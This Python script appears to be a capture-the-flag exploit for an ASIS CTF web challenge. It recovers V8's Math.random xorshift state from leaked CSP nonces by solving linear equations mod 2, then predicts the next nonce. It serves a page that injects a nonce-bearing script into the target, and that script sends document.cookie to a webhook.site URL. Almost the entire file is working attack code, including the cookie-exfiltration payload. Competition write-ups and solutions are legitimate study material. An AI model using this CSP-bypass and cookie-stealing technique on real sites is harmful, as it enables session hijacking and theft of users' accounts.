#!/usr/bin/env python3

import operator
import math
import struct
import socket
import re


class Math:
    ''' Implementation of Math.random(), as if it used no cache '''
    # some constant values for testing
    # state0 = 11409496708136656573
    # state1 = 18334895118323930352
    state0, state1 = 18334895118323930352, 508147093636674015

    @classmethod
    def random(cls):
        '''
        https://github.com/v8/v8/blob/17a99fec258bcc07ea9fc5e4fabcce259751db03/src/base/utils/random-number-generator.h#L111-L116
        '''
        ret = (cls.state0 >> 12) + 0x3ff0_0000_0000_0000
        ret, = struct.unpack('d', struct.pack('Q', ret))
        cls.nextRand()
        return ret - 1

    @classmethod
    def nextRand(cls):
        '''
        https://github.com/v8/v8/blob/17a99fec258bcc07ea9fc5e4fabcce259751db03/src/base/utils/random-number-generator.h#L119-L128
        '''
        s0 = cls.state1
        s1 = cls.state0
        cls.state0 = s0
        s1 ^= (s1 << 23) & 0xffff_ffff_ffff_ffff
        s1 ^= s1 >> 17
        s1 ^= s0
        s1 ^= s0 >> 26
        cls.state1 = s1


class VMath:
    ''' Implementation of Math.random(), as used in v8 '''
    cache = []

    @classmethod
    def random(cls):
        '''
        https://github.com/v8/v8/blob/17a99fec258bcc07ea9fc5e4fabcce259751db03/src/numbers/math-random.cc#L60-L67
        '''
        try:
            return cls.cache.pop()
        except IndexError:
            cls.cache = [Math.random() for _ in range(64)]
            return cls.cache.pop()


genNonce = lambda: ''.join(
    "abcdefghijklmnopqrstuvwxyz0123456789"[int(VMath.random()*36)]
    for _ in range(16))
genNonceR = lambda: ''.join(
    "abcdefghijklmnopqrstuvwxyz0123456789"[int(Math.random()*36)]
    for _ in range(16))


class BitVec(list):
    '''A list of integers, implementing bitwise xor and shifts

    Represents a vector of bits, with each bit being a xor
    of some set of variables, represented by a python int.
    e.g.
        b4      --> 0b1000
        b2 + b0 --> 0b0101

    A bit vector equal to 0b(b63)(b62)...(b1)(b0)
    can gradually become sth like 0b(b20^b15^b7)(b6)(0)(b123^b54)...(b8)
    after several xorshift rounds.
    '''
    def __lshift__(self, sh):
        return BitVec([0] * sh + self[:-sh])

    def __rshift__(self, sh):
        return BitVec(self[sh:] + [0] * sh)

    def __xor__(self, sh):
        return BitVec(map(operator.xor, self, sh))


def seed_from_sequence(nonce):
    '''This will create and solve a system of linear equations mod 2.

    Each matrix row will be represented by a python int,
    where bit 0 is the value, bits 1-129 are the variables.
    e.g. b7 + b2 + b1 = 1 --> 0b100001101
         b6 + b2 + b0 = 0 --> 0b010001010
         b6 + b2 + b0 = 1 --> 0b010001011
    '''

    # each bit is initially a single variable (represented by a single bit)
    xorshift0 = BitVec([2 ** i for i in range(0, 64)])
    xorshift1 = BitVec([2 ** i for i in range(64, 128)])

    # list of rows in the matrix
    paralela = []

    for x in nonce:
        try:
            # the value of the relevant floor(Math.random() * 36) call
            v = 'abcdefghijklmnopqrstuvwxyz0123456789'.index(x)
        except ValueError:
            # there might be intermediary values that we don't know
            # which is completely valid and irrelevant to the algorithm
            pass
        else:
            # minimum and maximum possible values of the relevant seed bits
            vmin = (2 ** 52) * v // 36
            vmax = (2 ** 52) * (v+1) // 36 - 1

            vnow = vmax
            while vnow and vnow >= vmin:
                vmin2 = vnow
                vnow -= vnow & -vnow
            vnow = vmin
            while vnow <= vmax:
                vmax2 = vnow
                vnow += ~vnow & -~vnow

            # minimum and maximum bit mask
            vmin2 &= vmin & vmax
            vmax2 |= vmin | vmax

            # these are the bits we know for sure
            suremask = ~(vmin2 ^ vmax2)

            # print('%013x ... %013x: %013x ... %013x' % (vmin, vmax, vmin2, vmax2))
            # print('%013x === %013x' % (suremask & (2**52-1), vmin2))

            for i in range(51, -1, -1):
                if vmin2 & (2**i) == vmax2 & (2**i):
                    # We are getting an extra linear equation now:
                    # the value currently in (12 + i)-th bit of xorshift0
                    # must be equal to the i-th bit of vmin2
                    # (or vmax2, they agree on this bit).
                    paralela.append((xorshift0[12 + i] << 1) | bool(vmin2 & (2**i)))

        # compute the next state from current state
        x0 = xorshift1
        x1 = xorshift0
        xorshift0 = x0
        x1 ^= x1 << 23
        x1 ^= x1 >> 17
        x1 ^= x0
        x1 ^= x0 >> 26
        xorshift1 = x1

    # https://en.wikipedia.org/wiki/Gaussian_elimination
    # In mod 2 world this is actually as simple as xoring
    # everything pairwise (2 times to be sure).
    for _ in range(2):
        for i, x in enumerate(paralela):
            if x < 1:
                continue
            j = int(math.log2(x))
            for k, y in enumerate(paralela):
                if k != i and y & (2**j):
                    paralela[k] ^= x

    print(sorted(set(paralela))[:2])
    st0ok = st1ok = None

    # If we get to an equation of e.g.
    #     x0 ^ x0 ^ x1 ^ x1 = 1
    # it simplifies to 0 = 1 and we know for sure
    # that such a sequence of nonces was simply impossible.
    if 1 in paralela:
        print(nonce, 'unsatisfiable')
    else:
        st0ok = st1ok = 0
        have = set()
        for x in paralela:
            if x < 2:
                continue
            # each value should be either 0b100...0001 or 0b100...0000 now
            j = int(math.log2(x))
            have.add(j)
            if x & 1:
                if j <= 64:
                    st0ok |= 2 ** (j - 1)
                else:
                    st1ok |= 2 ** (j - 65)
        missing = set(range(1, max(have))) - have  # set of bits still unknown
        print('missing =', missing)  # should be an empty set

        print(bin(st0ok)[2:].zfill(64))
        print(bin(st1ok)[2:].zfill(64))

        Math.state0 = st0ok
        Math.state1 = st1ok

        print(genNonceR())
        print(nonce, '(orig)')

    return st0ok, st1ok


# Dear python devs, I wonder really hard, why are these not the defaults??
serv = socket.create_server(('::', 8032), family=socket.AF_INET6, dualstack_ipv6=True)
while cli := serv.accept():
    cli, _ = cli
    cli.recv(1)
    print('conn')
    st0ok = None
    while st0ok is None:
        # use request pipelining to minimize the chance of someone interfering
        # (it might happen anyway :-)
        s = socket.create_connection(('lovely-nonces.asisctf.com', 8000))
        s.send(b'GET / HTTP/1.1\r\n\r\n' * 3)
        d = b''
        while d.count(b"nonce-") < 3:
            d += s.recv(99999)
        s.close()
        #print(repr(d))
        d = re.findall("nonce-([^']*)", d.decode())
        print('NONCES:', d)

        nonce0, nonce1, nonce2 = d[:3]

        print(nonce0, nonce1, nonce2)

        for nonce in (nonce2[::-1] + nonce1[::-1] + nonce0[::-1],
                      nonce0[::-1] + '?' * 80 + nonce2[::-1] + nonce1[::-1],
                      nonce1[::-1] + nonce0[::-1] + '?' * 80 + nonce2[::-1]):
            st0ok, st1ok = seed_from_sequence(nonce)
            if st0ok is not None:
                break

    Math.state0 = st0ok
    Math.state1 = st1ok

    for _ in range(16 * 8):  # skip over 8 next nonces (incl. our 3)
        Math.nextRand()
    nowy_nonce_na_pewno = genNonceR()[::-1]

    print(nowy_nonce_na_pewno)
    resp = f'''\
<html>
<head>

<script>

const sleep = d => new Promise(r => setTimeout(r, d));

window.onload = async () => {{
    for(i=0;i<20;i++){{

    const xy =   window.open('http://localhost:8000/');
    await sleep(100);
    xy.location = 'http://localhost:8000/#%3Ciframe%20srcdoc%3D%22%3Cscript%20nonce%3D{nowy_nonce_na_pewno}%3Elocation%3D%60https%3A%2F%2Fwebhook.site%2F9583f51e-2a4d-4ad1-80e5-60f6fee1a3f6%2F%3Fc%3D%60%2Bdocument.cookie%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E';
              
    
    }}
}}

</script>
</head>

    <body>

    </body>
</html>
'''.encode()
    cli.send(b'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n'
             b'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(resp)
             + resp)

